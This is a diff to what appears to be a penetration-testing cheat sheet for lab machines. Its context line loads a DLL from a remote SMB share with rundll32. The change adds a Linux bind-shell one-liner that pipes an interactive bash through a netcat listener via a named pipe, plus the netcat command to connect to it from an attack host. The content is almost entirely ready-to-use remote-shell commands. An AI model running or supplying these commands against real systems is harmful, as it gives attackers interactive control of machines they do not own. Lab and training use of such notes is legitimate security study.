@@ -18,9 +18,13 @@ rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
 ## Linux
 
 ```bash
-# target
+# target bind shells
 nc -lvnp 1337
 
-# attack host to target
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
+
+```bash
+# connect from attack host to target
 nc -nv 10.129.41.200 7777
 ```
